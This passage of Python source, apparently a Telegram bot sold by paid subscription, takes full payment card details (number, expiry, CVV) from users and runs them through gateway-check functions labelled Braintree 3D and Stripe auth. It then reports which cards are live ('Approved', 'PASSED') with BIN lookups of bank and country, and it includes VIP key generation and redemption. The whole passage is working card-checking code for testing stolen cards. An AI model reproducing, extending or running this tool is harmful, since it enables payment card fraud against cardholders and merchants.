	msgf=f'''<b> Approved ✅
[ϟ] Card ->  <code>{cc}</code>
[ϟ] Status -> {last}
[ϟ] Gate -> {gate}

card Info -><code> {card_type}</code> -<code> {brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 
[ϟ] Time -> {"{:.1f}".format(execution_time)} Seconds. [VIP]
[ϟ] Programmer -> @I_PNP⚡</b>'''
	if 'success' in last or 'Thank you for your order.' in last or 'Thank you' in last or 'Charged' in last or 'Charged !✅' in last or 'success' in last or 'Success' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	elif "funds" in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgf)
	elif "card's security" in last or 'ccn' in last or 'cvv' in last or 'Insufficient funds' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgc)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)		

			
@bot.message_handler(func=lambda message: message.text.lower().startswith('.otp') or message.text.lower().startswith('/otp') or message.text.lower().startswith('.vbv') or message.text.lower().startswith('/vbv') or message.text.lower().startswith('/vb') or message.text.lower().startswith('.vb'))
def respond_to_vbv(message):
	gate='Brantree OTP 3D'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/i_PnP")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/i_pnp1")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/i_pnp")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/i_pnp")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝑯𝑬𝑳𝑳𝑶 {name}
			
¶ Subscription plan prices ⬇️
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
• 1- days ~> 2,5$. ✓
• 3- days ~> 5$. ✓
• 7- days ~> 9$. ✓
• 14- days ~> 14$. ✓
• 1- month ~> 24$. ✓
• 2- month ~> 40$. ✓ 
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
All payment methods are available. 💸
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

𝑪𝑳𝑰𝑪𝑲 /cmds 𝑻𝑶 𝑽𝑰𝑬𝑾 𝑻𝑯𝑬 𝑪𝑶𝑴𝑴𝑨𝑵𝑫𝑺

𝒀𝑶𝑼𝑹 𝑷𝑳𝑨𝑵 𝑵𝑶𝑾 {BL}</b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/i_pnp")
		ahmed = types.InlineKeyboardButton(text="✨ 𝘾𝙃𝘼𝙉𝙉𝙀𝙇  ✨", url="https://t.me/i_pnp1")
		keyboard.add(contact_button, ahmed)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(vbv(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		level = data['level']
	except:
	    level = 'Unknown'
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b> 𝗣𝗔𝗦𝗦𝗘𝗗  ✅ 
CC -> <code>{cc}</code>
Gateway -><code> {gate}</code>
Response -> <code>{last}</code>
card Info -><code> {card_type}</code> -<code> {brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 
Dev : 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='tg://user?id=5268530944'>DRGAM</a>
Taken {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
#3D
CC -> <code>{cc}</code>
Gateway -><code> {gate}</code>
Response -> <code>{last}</code>
card Info -><code> {card_type}</code> -<code> {brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 
Dev : 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='tg://user?id=5268530944'>DRGAM</a>
Taken {"{:.1f}".format(execution_time)} secounds .</b>'''
	if 'Authenticate Attempt Successful' in last or 'Authenticate Successful' in last or 'authenticate_successful' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text= msgd)
@bot.message_handler(func=lambda message: message.text.lower().startswith('.chk') or message.text.lower().startswith('/chk'))
def respond_to_vbv(message):
	gate='strip Auth'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/I_PNP")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 </b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/I_PNP")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 </b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/I_PNP")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝗕𝗢𝗧 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(Tele(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>Approved ✅
#Braintree
[ϟ] Card ->  <code>{cc}</code>
[ϟ] Status -> {last}
[ϟ] Gate -> {gate}

card Info -><code> {card_type}</code> -<code> {brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 

[ϟ] Time -> {"{:.1f}".format(execution_time)} Seconds. [VIP]
[ϟ] Programmer -> @I_PNP⚡</b>'''
	msgd=f'''<b>Invalid ❌
#Braintree
CC -> <code>{cc}</code>
Gateway -><code> {gate}</code>
Response -> <code>{last}</code>
card Info -><code> {card_type}</code> -<code> {brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 
Dev : 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='tg://user?id=5268530944'>DRGAM</a>
Taken {"{:.1f}".format(execution_time)} secounds .</b>'''
	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last or 'success' in last or 'Success' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)	



@bot.message_handler(func=lambda message: message.text.lower().startswith('.ua') or message.text.lower().startswith('/ua'))
def respond_to_vbv(message):
	gate='strip Auth'
	name = message.from_user.first_name
	idt=message.from_user.id
	id=message.chat.id
	with open('data.json', 'r') as json_file:
		json_data = json.load(json_file)

	try:BL=(json_data[str(idt)]['plan'])
	except:
		with open('data.json', 'r') as json_file:
			existing_data = json.load(json_file)
		new_data = {
			id : {
  "plan": "𝗙𝗥𝗘𝗘",
  "timer": "none",
			}
		}
		existing_data.update(new_data)
		with open('data.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
		BL='𝗙𝗥𝗘𝗘'
	if BL == '𝗙𝗥𝗘𝗘':
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/I_PNP")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 </b>
''',reply_markup=keyboard)
		return
	with open('data.json', 'r') as file:
		json_data = json.load(file)
		date_str=json_data[str(id)]['timer'].split('.')[0]
	try:
		provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
	except Exception as e:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/I_PNP")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗛𝗘𝗟𝗟𝗢 {name}
𝗧𝗛𝗜𝗦 𝗣𝗔𝗥𝗧𝗜𝗖𝗨𝗟𝗔𝗥 𝗕𝗢𝗧 𝗜𝗦 𝗡𝗢𝗧 𝗙𝗥𝗘𝗘 </b>
''',reply_markup=keyboard)
		return
	current_time = datetime.now()
	required_duration = timedelta(hours=0)
	if current_time - provided_time > required_duration:
		keyboard = types.InlineKeyboardMarkup()
		contact_button = types.InlineKeyboardButton(text="✨ 𝗢𝗪𝗡𝗘𝗥  ✨", url="https://t.me/I_PNP")
		keyboard.add(contact_button)
		bot.send_message(chat_id=message.chat.id, text=f'''<b>𝗬𝗢𝗨 𝗖𝗔𝗡𝗡𝗢𝗧 𝗨𝗦𝗘 𝗧𝗛𝗘 𝗕𝗢𝗧 𝗕𝗘𝗖𝗔𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 𝗛𝗔𝗦 𝗘𝗫𝗣𝗜𝗥𝗘𝗗</b>
	''',reply_markup=keyboard)
		with open('data.json', 'r') as file:
			json_data = json.load(file)
		json_data[str(id)]['timer'] = 'none'
		json_data[str(id)]['paln'] = '𝗙𝗥𝗘𝗘'
		with open('data.json', 'w') as file:
			json.dump(json_data, file, indent=2)
		return
	try:command_usage[idt]['last_time']
	except:command_usage[idt] = {
				'last_time': datetime.now()
			}
	if command_usage[idt]['last_time'] is not None:
		time_diff = (current_time - command_usage[idt]['last_time']).seconds
		if time_diff < 30:
			bot.reply_to(message, f"<b>Try again after {30-time_diff} seconds.</b>",parse_mode="HTML")
			return	
	ko = (bot.reply_to(message, "- Wait checking your card ...").message_id)
	try:
		cc = message.reply_to_message.text
	except:
		cc=message.text
	cc=str(reg(cc))
	if cc == 'None':
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''<b>🚫 Oops!
Please ensure you enter the card details in the correct format:
Card: XXXXXXXXXXXXXXXX|MM|YYYY|CVV</b>''',parse_mode="HTML")
		return
	start_time = time.time()
	try:
		command_usage[idt]['last_time'] = datetime.now()
		last = str(Tele(cc))
	except Exception as e:
		last='Error'
	try: data = requests.get('https://bins.antipublic.cc/bins/'+cc[:6]).json()
	except: pass
	try:
		brand = data['brand']
	except:
		brand = 'Unknown'
	try:
		card_type = data['type']
	except:
		card_type = 'Unknown'
	try:
		country = data['country_name']
		country_flag = data['country_flag']
	except:
		country = 'Unknown'
		country_flag = 'Unknown'
	try:
		bank = data['bank']
	except:
		bank = 'Unknown'
	end_time = time.time()
	execution_time = end_time - start_time
	msg=f'''<b>Approved ✅
#Braintree
[ϟ] Card ->  <code>{cc}</code>
[ϟ] Status -> {last}
[ϟ] Gate -> {gate}

card Info -><code> {card_type}</code> -<code> {brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 

[ϟ] Time -> {"{:.1f}".format(execution_time)} Seconds. [VIP]
[ϟ] Programmer -> @I_PNP⚡</b>'''
	msgd=f'''<b>Invalid ❌
#Braintree
CC -> <code>{cc}</code>
Gateway -><code> {gate}</code>
Response -> <code>{last}</code>
card Info -><code> {card_type}</code> -<code> {brand}</code>
Bank -> <code>{bank}</code>
Counrty -> <code>{country}</code> - {country_flag} 
Dev : 𝗕𝗼𝘁 𝗕𝘆 ⇾ <a href='tg://user?id=5268530944'>DRGAM</a>
Taken {"{:.1f}".format(execution_time)} secounds .</b>'''
	if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last or 'success' in last or 'Success' in last:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	else:
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msgd)	







@bot.message_handler(func=lambda message: message.text.lower().startswith('.redeem') or message.text.lower().startswith('/redeem'))
def respond_to_vbv(message):
	def my_function():
		global stop
		try:
			re=message.text.split(' ')[1]
			with open('data.json', 'r') as file:
				json_data = json.load(file)
			timer=(json_data[re]['time'])
			typ=(json_data[f"{re}"]["plan"])
			json_data[f"{message.from_user.id}"]['timer'] = timer
			json_data[f"{message.from_user.id}"]['plan'] = typ
			with open('data.json', 'w') as file:
				json.dump(json_data, file, indent=2)
			with open('data.json', 'r') as json_file:
				data = json.load(json_file)
			del data[re]
			with open('data.json', 'w') as json_file:
				json.dump(data, json_file, ensure_ascii=False, indent=4)
			msg=f'''<b>ÃBĐO 𝗩𝗜𝗣 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗕𝗘𝗗 ✅
𝑺𝑼𝑩𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {timer}
𝗧𝗬𝗣 ➜ {typ}</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,'<b>Incorrect code or it has already been redeemed </b>',parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()#x8xt8
@bot.message_handler(commands=["code"])
def start(message):
	def my_function():
		id=message.from_user.id
		if not id ==admin:
			return
		try:
			h=float(message.text.split(' ')[1])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			characters = string.ascii_uppercase + string.digits
			pas ='otpbot-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))+'-'+''.join(random.choices(characters, k=4))
			current_time = datetime.now()
			ig = current_time + timedelta(hours=h)
			plan='𝗩𝗜𝗣'
			parts = str(ig).split(':')
			ig = ':'.join(parts[:2])
			with open('data.json', 'r') as json_file:
				existing_data = json.load(json_file)
			new_data = {
				pas : {
	  "plan": plan,
	  "time": ig,
			}
			}
			existing_data.update(new_data)
			with open('data.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)	
			msg=f'''<b>𝗡𝗘𝗪 𝗞𝗘𝗬 𝗖𝗥𝗘𝗔𝗧𝗘𝗗 🚀
	
𝗣𝗟𝗔𝗡 ➜ {plan}
𝗘𝗫𝗣𝗜𝗥𝗘𝗦 𝗜𝗡 ➜ {ig}
𝗞𝗘𝗬 ➜ <code>/redeem {pas}</code>
 [𝗞𝗘𝗬]BY : @X8XT8</b>'''
			bot.reply_to(message,msg,parse_mode="HTML")
		except Exception as e:
			print('ERROR : ',e)
			bot.reply_to(message,e,parse_mode="HTML")
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
	
	


@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'
print("تم تشغيل البوت")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print("ERORR")
#bot.polling()
# === End of bot.py ===

